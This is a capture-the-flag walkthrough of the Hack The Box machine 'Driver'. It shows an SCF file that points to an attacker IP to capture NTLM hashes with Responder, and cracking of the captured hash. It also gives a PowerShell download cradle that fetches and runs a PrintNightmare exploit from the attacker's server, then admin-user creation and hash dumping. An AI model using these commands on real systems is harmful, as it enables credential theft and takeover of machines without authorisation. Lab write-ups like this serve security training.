+++
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Responder", "CFS", "PrintNightmare", "CVE-2021-1675", "Download Cradle"]
draft = false
title = "Driver HTB Walkthrough"
author = "bloodstiller"
date = 2024-11-12
toc = true
bold = true
next = true
+++

## Driver Hack The Box Walkthrough/Writeup: {#driver-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Driver>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans  🍣 main 📝 ×139🛤️  ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 09:49:09 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:49 GMT
        Nmap scan report for 10.129.250.87
        Host is up (0.038s latency).
        Not shown: 997 filtered tcp ports (no-response)
        PORT    STATE SERVICE
        80/tcp  open  http
        135/tcp open  msrpc
        445/tcp open  microsoft-ds

        Nmap done: 1 IP address (1 host up) scanned in 5.34 seconds
        ```
    -   **Initial thoughts**:
        -   RPC
        -   Web
        -   SMB


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell
          kali in Walkthroughs/HTB/BlogEntriesMade/Driver/scans  🍣 main 📝 ×139🛤️  ×1 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
          🕙 09:49:57 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
          [sudo] password for kali:
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:50 GMT
          Nmap scan report for 10.129.250.87
          Host is up (0.067s latency).
          Not shown: 65531 filtered tcp ports (no-response)
          PORT     STATE SERVICE      VERSION
          80/tcp   open  http         Microsoft IIS httpd 10.0
          |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
          | http-auth:
          | HTTP/1.1 401 Unauthorized\x0D
          |_  Basic realm=MFP Firmware Update Center. Please enter password for admin
          | http-methods:
          |_  Potentially risky methods: TRACE
          |_http-server-header: Microsoft-IIS/10.0
          135/tcp  open  msrpc        Microsoft Windows RPC
          445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
          5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
          OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
          No OS matches for host
          Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

          Host script results:
          |_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
          | smb2-security-mode:
          |   3:1:1:
          |_    Message signing enabled but not required
          | smb2-time:
          |   date: 2024-11-11T16:53:11
          |_  start_date: 2024-11-11T16:45:48
          | smb-security-mode:
          |   account_used: guest
          |   authentication_level: user
          |   challenge_response: supported
          |_  message_signing: disabled (dangerous, but default)

          OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 186.52 seconds

        ```
    -   **Findings**:
        -   It says above `"Please enter password for admin"` which means there is some sort of admin panel present I imagine.
        -   This is not part of a domain as it says it's part of a `WORKGROUP`:
            -   `445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)`


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   Both are disabled:
        -   {{< figure src="/ox-hugo/2024-11-11-095350_.png" >}}
    -   +Discoveries+:
        -   What is interesting is that it's running `SMBv1` and we have the windows version also `Windows 10 Enterprise 10240 x64`


### RPC: {#rpc}

-   +Cheatsheet+: I have an enumeration &amp; attacking cheatsheet for RPC, available here:
    -   <https://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient>

-   **Null session via RPC**:
    -   Much like SMB you can also connect to RPC via null &amp; guest sessions, let's see if they are valid here:
        -   `rpcclient -U "" $box`
        -   `rpcclient -U '%' $box`
        -   Both fail.
            -   {{< figure src="/ox-hugo/2024-11-11-110700_.png" >}}


### Web `80`: {#web-80}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### Website Overview: {#website-overview}

-   Immediately when I try and access the site I am greeted with a basic authentication panel.
-   As we saw above it says `"Please enter password for admin"` I enter default creds of admin:admin and get access.
    -   {{< figure src="/ox-hugo/2024-11-11-100352_.png" >}}
-   We can see there is an email address at the bottom too, lets add this to our list:
    -   {{< figure src="/ox-hugo/2024-11-11-102115_.png" >}}


#### Enumerating Injection Points: {#enumerating-injection-points}

-   The only viable injection point is the upload page. Where can upload a file that will be manually checked &amp; tested.
    -   {{< figure src="/ox-hugo/2024-11-11-100629_.png" >}}
    -   We may be able to upload a reverse shell.
        -   We can see the website is running `.php` so we can use a php reverse web shell.

-   **I use the pentestmonkey one that is on revshells**:
    -   {{< figure src="/ox-hugo/2024-11-11-101123_.png" >}}
    -   I upload the shell and start my listener:
        -   {{< figure src="/ox-hugo/2024-11-11-101143_.png" >}}
    -   I do not get a hit though:
        -   {{< figure src="/ox-hugo/2024-11-11-101209_.png" >}}


#### Directory Enumeration the web-server using ffuf: {#directory-enumeration-the-web-server-using-ffuf}

-   **I Perform some directory busting to see if there are any interesting directories**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-11-11-095525_.png" >}}
    -   Nothing interesting from an unauthenticated session.

-   **I try dirbusting with an authenticated session by passing** `base64` **encoded credentials**:
    -   Base64 encode our credentials:
        -   `echo -n 'admin:admin' | base64`
        -   {{< figure src="/ox-hugo/2024-11-11-104810_.png" >}}
    -   Dirbust:
        -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic -H "Authorization: Basic YWRtaW46YWRtaW4="`
        -   {{< figure src="/ox-hugo/2024-11-11-105314_.png" >}}
    -   Again nothing of note.


## 2. Foothold: {#2-dot-foothold}


### Using an SCF File to get a users NTLM hash: {#using-an-scf-file-to-get-a-users-ntlm-hash}

As this host allows uploads it may be possible to upload a malicious `.scf` file to force them to authenticate back to our attack host and send us their NTLM hash.

-   **I save the below as a** `.scf` **file**:
    ```shell
    [Shell]
    Command=2
    IconFile=\\10.10.14.97\share\LasjetJet.ico
    [Taskbar]
    Command=ToggleDesktop
    ```

    -   +Note+:
        -   I name it `@PrinterDriver.scf` so it's something similar what would be uploaded so it does not arouse suspicion &amp; looks legitimate.
        -   Put an `@` at the start of the name so it appears at the top and ensure it is executed as soon as the user accesses the share it is in. This way the user does not need to click on it and it will trigger.
        -   This type of attack is typically done with SMB shares.

-   **I start responder**:
    -   `sudo responder -wd -v -I tun0`
    -   {{< figure src="/ox-hugo/2024-11-11-122444_.png" >}}

-   **I upload the** `.scf`:
    -   {{< figure src="/ox-hugo/2024-11-11-115315_.png" >}}

-   **I get a hit &amp; get back the user tony's NTLM hash**:
    -   {{< figure src="/ox-hugo/2024-11-11-115522_.png" >}}


##### SCF (Shell Command File) Primer: {#scf--shell-command-file--primer}

-   **Purpose:** Originally designed for quick access to certain Windows system commands, like opening Windows Explorer or the Recycle Bin.

-   **File Extension:** `.scf`

-   **Format:** Plain text file with commands in a specific format, commonly referencing icon locations.

-   **Common Fields:**
    -   `[Shell]` – Header indicating it’s an SCF file.
    -   `Command` – Specifies the command or action to take, like opening Windows Explorer.
    -   `IconFile` – Points to an icon resource (e.g., file path or UNC path).

-   **Exploitability:**
    -   SCF files can be exploited because Windows automatically renders icon files specified in SCF files.
    -   By pointing the **IconFile** field to a remote UNC path, an attacker can trigger Windows Explorer to initiate an SMB connection to the specified path, leaking NTLM hashes in the process.

-   **Mitigation Tips**:
    -   Disabling SMBv1 and securing SMB authentication settings can help mitigate risks associated with SCF file exploitation.
    -   Recent versions of Windows Server (2019+) handle SCF files differently, limiting their exploitability.


##### SCF Exploit Explained: {#scf-exploit-explained}

-   **SCF File Exploit**:
    -   `SCF` (Shell Command File's): Can be modified to point its icon file location to a specific UNC (Universal Naming Convention) path, typically an IP address.
    -   **Result of manipulation**:
        -   Windows Explorer automatically initiates an SMB (Server Message Block) session when accessing the folder with the modified .scf file.
        -   This action sends the victim's NTLMv2 hash to our attack host.
    -   **Exploitation Tools**:
        -   Tools like Responder, Inveigh, or InveighZero can be used to poison and capture the NTLMv2 hashes sent by the victim.
        -   +Simplified Explanation+: By putting a malicious `.scf` file on the target that points to our host the victim will attempt to authenticate back to us and in doing so will send their NTLMv2 hash which we can capture
    -   +Note+:
        -   If the target system is Windows Server 2019 or newer, an LNK file must be used instead of an SCF file.


### Cracking Tony's hash with hashcat: {#cracking-tony-s-hash-with-hashcat}

-   **I crack it with hashcat**:
    -   `hashcat -m 5600 tony.hash /home/kali/Wordlists/rockyou.txt -O`
    -   {{< figure src="/ox-hugo/2024-11-11-120040_.png" >}}

<!--listend-->

-   **Verify they work**:
    -   {{< figure src="/ox-hugo/2024-11-11-120204_.png" >}}


### Enumerating Users with RPC: {#enumerating-users-with-rpc}

-   **I connect using rpcclient and list the users**:
    -   `rpcclient -U 'tony' $box`
    -   {{< figure src="/ox-hugo/2024-11-11-123959_.png" >}}
    -   There are only 2 other users other than tony, Guest (which is disabled and Administrator)

-   **I check the description field for the Administrator user in-case there is a password in it etc**:
    -   `queryuser 0x1f4`
    -   {{< figure src="/ox-hugo/2024-11-11-132007_.png" >}}
    -   There isn't :(


### Enumerating as Tony: {#enumerating-as-tony}

-   **I connect via evil winrm**:
    -   `evil-winrm -i $box -u $user -p $pass`

-   **Grab the user flag**:
    -   {{< figure src="/ox-hugo/2024-11-11-132234_.png" >}}

-   **I check PowerShell history but nothing**:
    -   `(Get-PSReadLineOption).HistorySavePath`
    -   {{< figure src="/ox-hugo/2024-11-11-132505_.png" >}}

-   **Check my privs**:
    -   `whoami /priv`
    -   {{< figure src="/ox-hugo/2024-11-11-132559_.png" >}}
    -   Nothing interesting.

-   **I Check the** `fw_up.php` **and** `index.php`:
    -   I check both the website `.php` files in the web-root(`wwwroot`) but neither hold anything interesting.
        -   {{< figure src="/ox-hugo/2024-11-11-132908_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Discovering the host is vulnerable to PrintNightmare CVE-2021-1675: {#discovering-the-host-is-vulnerable-to-printnightmare-cve-2021-1675}

-   **As the box is called** `driver` **and there have been various nods to printers I check if the it's susceptible to** `PrintNightmare` **with netexec**:
    -   `netexec smb $box -u $user -p $pass -M printnightmare`
    -   {{< figure src="/ox-hugo/2024-11-11-133623_.png" >}}
    -   It is, lets attack.
    -   +Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for `PrintNightmare` is one of these checks (I didn't just magically stumble upon the idea). However now we have a viable path forward.


### Adding an Admin User using PrintNightmare CVE-2021-1675: {#adding-an-admin-user-using-printnightmare-cve-2021-1675}

-   **Get exploit**:
    -   Lets get the POC.
    -   `wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1`
    -   {{< figure src="/ox-hugo/2024-11-11-135505_.png" >}}

-   **Start python server**:
    -   `python3 -m http.server 9000`
    -   {{< figure src="/ox-hugo/2024-11-11-135448_.png" >}}
    -   +Note+: I have this command aliased to `pws`

-   **Use download cradle to load into memory**:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')`
    -   {{< figure src="/ox-hugo/2024-11-11-135533_.png" >}}

-   +Deep Dive+: I have a deep dive into download cradles and how they work: 
    -   https://bloodstiller.com/articles/understandingdownloadcradles/

-   **Create new user &amp; add them to the admins**:
    -   `Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "bl00dst1ll3r!" -DriverName "PrintIt"`
    -   {{< figure src="/ox-hugo/2024-11-11-135700_.png" >}}

-   **Verify the user has been added**:
    -   `net user bloodstiller`
    -   {{< figure src="/ox-hugo/2024-11-11-135721_.png" >}}
    -   They have been.

-   **Verify the creds work**:
    -   {{< figure src="/ox-hugo/2024-11-11-140555_.png" >}}

-   **Get flag**:
    -   {{< figure src="/ox-hugo/2024-11-11-140758_.png" >}}

-   **Dump hashes with impacket-secretsdump**:
    -   `impacket-secretsdump $domain/$user:$pass@$box`
    -   {{< figure src="/ox-hugo/2024-11-11-140935_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  It took me a long time to see you could upload an SCF so long as it was being accessed from a share/etc it would work.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Not too many, may be getting better, here's hoping.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


